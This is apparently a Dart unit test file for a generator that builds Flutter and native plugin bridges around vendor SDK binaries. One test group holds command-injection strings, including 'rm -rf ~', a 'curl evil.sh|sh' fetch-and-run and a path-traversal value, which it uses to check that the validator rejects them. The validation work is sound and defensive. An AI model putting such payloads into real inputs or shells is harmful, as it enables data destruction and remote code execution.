import 'dart:io';

import 'package:binary_sdk_bridge/binary_sdk_bridge.dart';
import 'package:test/test.dart';

BridgeSpec _spec({
  String? ios = 'AcmeSDK',
  String? aar = 'AcmeSDK',
  BridgeFlavor flavor = BridgeFlavor.flutter,
}) =>
    BridgeSpec(
      pluginName: 'acme_ads',
      organization: 'com.example',
      flavor: flavor,
      iosFrameworkName: ios,
      androidAarName: aar,
    );

void main() {
  group('BridgeSpec', () {
    test('derives the names the templates depend on', () {
      final spec = _spec();
      expect(spec.pluginClassName, 'AcmeAds');
      expect(spec.kitName, 'AcmeAdsKit');
      expect(spec.iosProductName, 'acme-ads');
      expect(spec.androidPackage, 'com.example.acme_ads');
      expect(spec.sdkDefine, 'ACME_ADS_SDK');
    });

    test('channel name reserves the bare name for a future EventChannel', () {
      // Flutter's binary messenger keys handlers by name alone, so the suffix
      // is what stops a later EventChannel replacing this handler silently.
      expect(_spec().channelName, 'acme_ads/acme_ads_method');
    });

    test('rejects a non-snake_case plugin name', () {
      expect(
        () => BridgeSpec(pluginName: 'AcmeAds', organization: 'com.example')
            .validate(),
        throwsA(isA<FormatException>()),
      );
    });

    test('rejects an organization that is not reverse-DNS', () {
      expect(
        () => BridgeSpec(pluginName: 'acme_ads', organization: 'example')
            .validate(),
        throwsA(isA<FormatException>()),
      );
    });

    test('rejects a spec with neither platform', () {
      expect(
        () => _spec(ios: null, aar: null).validate(),
        throwsA(isA<FormatException>()),
      );
    });
  });

  group('input that would break or endanger the generated files', () {
    void rejects(String why, BridgeSpec Function() build) {
      test(why, () => expect(build, throwsA(isA<FormatException>())));
    }

    // Binary names land inside generated SHELL SCRIPTS. A name carrying a
    // quote or a command substitution would execute when someone runs
    // tool/fetch_*.sh — this is the one input that must never be trusted.
    for (final evil in [
      r'Vendor$(rm -rf ~)',
      'Vendor";curl evil.sh|sh;"',
      'Vendor`whoami`',
      'Vendor SDK',
      '../../etc/passwd',
      '-Vendor',
    ]) {
      rejects('rejects a dangerous binary name: $evil', () {
        BridgeSpec(
          pluginName: 'acme_ads',
          organization: 'com.example',
          iosFrameworkName: evil,
        ).validate();
        return _spec();
      });
    }

    rejects('rejects a deployment target that is not a version', () {
      BridgeSpec(
        pluginName: 'acme_ads',
        organization: 'com.example',
        iosFrameworkName: 'AcmeSDK',
        iosDeploymentTarget: 'latest',
      ).validate();
      return _spec();
    });

    rejects('rejects compileSdk below minSdk', () {
      BridgeSpec(
        pluginName: 'acme_ads',
        organization: 'com.example',
        androidAarName: 'AcmeSDK',
        androidMinSdk: 34,
        androidCompileSdk: 21,
      ).validate();
      return _spec();
    });

    rejects('rejects a Java version Gradle does not accept', () {
      BridgeSpec(
        pluginName: 'acme_ads',
        organization: 'com.example',
        androidAarName: 'AcmeSDK',
        javaVersion: 13,
      ).validate();
      return _spec();
    });

    test('accepts the binary names real vendors actually ship', () {
      for (final ok in ['AcmeSDK', 'Acme-SDK', 'Acme_SDK', 'AcmeSDK2', 'a.b']) {
        expect(
          () => BridgeSpec(
            pluginName: 'acme_ads',
            organization: 'com.example',
            iosFrameworkName: ok,
          ).validate(),
          returnsNormally,
          reason: '$ok should be allowed',
        );
      }
    });
  });

  group('BridgeGenerator.plan', () {
    test('emits both platforms when both are requested', () {
      final paths = BridgeGenerator(_spec()).plan().map((f) => f.relativePath);

      expect(
        paths,
        containsAll([
          'pubspec.yaml',
          'lib/acme_ads.dart',
          'ios/acme_ads/Package.swift',
          'ios/acme_ads/Sources/AcmeAdsKit/AcmeAdsKit.swift',
          'android/build.gradle.kts',
          'android/src/noSdk/kotlin/com/example/acme_ads/sdk/VendorBridge.kt',
          'android/src/withSdk/kotlin/com/example/acme_ads/sdk/VendorBridge.kt',
        ]),
      );
    });

    test('omits iOS files when no framework is given', () {
      final paths =
          BridgeGenerator(_spec(ios: null)).plan().map((f) => f.relativePath);

      expect(paths.where((p) => p.startsWith('ios/')), isEmpty);
      expect(paths, contains('android/build.gradle.kts'));
    });

    test('marks the fetch scripts executable', () {
      final scripts = BridgeGenerator(_spec())
          .plan()
          .where((f) => f.relativePath.startsWith('tool/'));

      expect(scripts, isNotEmpty);
      expect(scripts.every((f) => f.executable), isTrue);
    });

    test('the two Android bridges expose identical signatures', () {
      // If they drift, `main` compiles in one configuration and not the other
      // — a break nobody sees until the vendor binary lands.
      final files = BridgeGenerator(_spec()).plan();
      String body(String needle) =>
          files.firstWhere((f) => f.relativePath.contains(needle)).contents;

      for (final signature in [
        'fun probe(): VendorState',
        'fun initialize(appId: String, testMode: Boolean): VendorState',
      ]) {
        expect(body('noSdk'), contains(signature));
        expect(body('withSdk'), contains(signature));
      }
    });
  });

  group('generated Package.swift', () {
    late String manifest;

    setUp(() {
      manifest = BridgeGenerator(_spec())
          .plan()
          .firstWhere((f) => f.relativePath.endsWith('Package.swift'))
          .contents;
    });

    test('gates the binaryTarget behind a filesystem probe', () {
      // The whole point: an unconditional binaryTarget with a missing path
      // fails the resolve of the entire package graph.
      expect(manifest, contains('FileManager.default.fileExists'));
      expect(manifest, contains('if sdkPresent {'));
      expect(manifest, contains('.binaryTarget('));
    });

    test('keeps Flutter out of the standalone kit target', () {
      // Split on the append calls rather than matching exact whitespace, so
      // reformatting the template does not break the assertion.
      final blocks = manifest.split('targets.append(');
      final kitBlock =
          blocks.firstWhere((b) => b.contains('name: "AcmeAdsKit"'));
      final pluginBlock =
          blocks.firstWhere((b) => b.contains('name: "acme_ads"'));

      expect(kitBlock, isNot(contains('FlutterFramework')));
      expect(pluginBlock, contains('FlutterFramework'));
    });

    test('exposes the dashed product Flutter looks for', () {
      expect(manifest, contains('.library(name: "acme-ads"'));
    });
  });

  group('lessons the generated code must not lose', () {
    String fileNamed(String needle) => BridgeGenerator(_spec())
        .plan()
        .firstWhere((f) => f.relativePath.contains(needle))
        .contents;

    test('the iOS fetch script clears ALL THREE SPM caches', () {
      // Clearing only Flutter's ephemeral dir leaves SwiftPM's GLOBAL manifest
      // cache intact, and since that cache is keyed on manifest CONTENT — which
      // does not change when the binary appears — the probe keeps reading
      // false. The result is a green build with no SDK linked and no warning
      // anywhere. Measured in production before this was fixed.
      final script = fileNamed('fetch_ios_sdk.sh');
      expect(script, contains('ios/Flutter/ephemeral'));
      expect(script, contains('build/ios/SourcePackages/manifests'));
      expect(script, contains('org.swift.swiftpm/manifests'));
    });

    test('the fetch script warns that a green build is not evidence', () {
      // `flutter build` passes -quiet to xcodebuild, which suppresses the
      // #warning the bridge emits, so its absence proves nothing.
      final script = fileNamed('fetch_ios_sdk.sh');
      expect(script, contains('-quiet'));
      expect(script, contains('swift package'));
    });

    test('the Android module keeps the vendor .aar off the compile classpath',
        () {
      // `implementation(files(...))` makes bundleDebugAar fail outright:
      // "Direct local .aar file dependencies are not supported when building
      // an AAR". runtimeOnly is both the fix and the honest declaration.
      final gradle = fileNamed('build.gradle.kts');
      expect(gradle, contains('runtimeOnly(files(vendorAar))'));
      expect(
        gradle,
        isNot(contains('implementation(files(vendorAar))')),
        reason: 'implementation() breaks bundleDebugAar',
      );
      expect(gradle, contains('bundleDebugAar'),
          reason: 'the limitation must be documented in the file itself');
    });
  });

  group('the native flavour carries no Flutter', () {
    List<GeneratedFile> nativeFiles() =>
        BridgeGenerator(_spec(flavor: BridgeFlavor.native)).plan();

    test('emits no Dart layer at all', () {
      final paths = nativeFiles().map((f) => f.relativePath);
      expect(paths, isNot(contains('pubspec.yaml')));
      expect(paths.where((p) => p.startsWith('lib/')), isEmpty);
      expect(paths.where((p) => p.startsWith('test/')), isEmpty);
      expect(paths.where((p) => p.endsWith('Plugin.swift')), isEmpty);
      expect(paths.where((p) => p.endsWith('Plugin.kt')), isEmpty);
    });

    test('still emits both native wrappers and the fetch scripts', () {
      final paths = nativeFiles().map((f) => f.relativePath);
      expect(paths, contains('ios/acme_ads/Package.swift'));
      expect(paths, contains('android/build.gradle.kts'));
      expect(paths.where((p) => p.startsWith('tool/')), hasLength(2));
    });

    test('Package.swift stays internally consistent', () {
      // The bug this catches: making the TARGET conditional while leaving the
      // product and dependency behind produced a manifest referencing a target
      // that does not exist — a package that cannot resolve at all.
      final manifest = nativeFiles()
          .firstWhere((f) => f.relativePath.endsWith('Package.swift'))
          .contents;
      expect(manifest, isNot(contains('FlutterFramework')));
      expect(manifest, isNot(contains('.library(name: "acme-ads"')));
      expect(manifest, contains('.library(name: "AcmeAdsKit"'));
      expect(manifest, contains('dependencies: [],'));
    });

    test('no unrendered template interpolation escapes into any file', () {
      // Escaping bugs in the templates print `\${spec.foo}` verbatim into the
      // generated file, which then looks like a working file until someone
      // reads it.
      for (final flavor in BridgeFlavor.values) {
        for (final file in BridgeGenerator(_spec(flavor: flavor)).plan()) {
          expect(
            file.contents,
            isNot(contains(r'${spec.')),
            reason:
                '\${file.relativePath} (\${flavor.name}) leaked a template expression',
          );
        }
      }
    });
  });

  group('BridgeGenerator.write', () {
    late Directory tmp;

    setUp(() => tmp = Directory.systemTemp.createTempSync('bsb_test'));
    tearDown(() => tmp.deleteSync(recursive: true));

    test('writes the planned files to disk', () {
      final root = BridgeGenerator(_spec()).write(tmp.path);

      expect(File('${root.path}/pubspec.yaml').existsSync(), isTrue);
      expect(
        File('${root.path}/ios/acme_ads/Package.swift').existsSync(),
        isTrue,
      );
    });

    test('refuses to overwrite an existing directory without --force', () {
      BridgeGenerator(_spec()).write(tmp.path);

      expect(
        () => BridgeGenerator(_spec()).write(tmp.path),
        throwsA(isA<StateError>()),
      );
      expect(
        () => BridgeGenerator(_spec()).write(tmp.path, force: true),
        returnsNormally,
      );
    });
  });
}
